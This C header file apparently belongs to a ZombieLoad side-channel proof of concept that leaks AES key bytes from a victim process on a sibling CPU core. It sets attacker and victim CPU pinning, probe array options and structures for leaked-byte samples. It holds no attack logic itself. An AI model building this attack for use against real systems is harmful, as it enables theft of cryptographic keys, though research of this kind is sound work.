#ifndef MAIN_H
#define MAIN_H

#define _GNU_SOURCE // required by sched.h

#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <poll.h>
#include <inttypes.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>

// CPU Layout:
//  +-- Physical CPU 0
//       +-- Logical CPU 0
//       |   +-- ZombieLoad
//       +-- Logical CPU 1 (or 4)
//           +-- Victim Process using aes-min (external)

// To change this layout, modify the following definitions accordingly:

#define CPU_ATTACKER 0
#define CPU_VICTIM 1

#define VICTIM_BINARY_PATH "../victim/bin/victim"

// Allocate the probe array on 4KB pages (0) or 2MB pages (1)?
#define USE_HUGEPAGE_PROBE_ARRAY 0

#define KEY_LENGTH 16
#define PLAINTEXT_LENGTH 16
#define NUM_POSITIONS 16
#define NUM_BYTES 256
#define NUM_RANKING 5
#define NUM_ITERATIONS_PER_POS 500

#define STR_VALUE_INTERNAL(x) #x
#define STR_VALUE(x) STR_VALUE_INTERNAL(x)
#define CPU_VICTIM_STR STR_VALUE(CPU_VICTIM)

#include "utils.h"
#include "zombieload.h"

typedef struct {
	uint8_t byte; // ZombieLoad: Leaked Byte
	uint8_t pos; // Byte position
	uint32_t ptid; // Plain Text ID
} sample;

typedef struct {
	uint32_t id;
	uint8_t bytes[PLAINTEXT_LENGTH];
} plaintext;

typedef struct {
	uint8_t byte;
	uint32_t count;
} success_ctr_elem;

static const uint8_t aes_sbox[256] = {
    
};

#endif
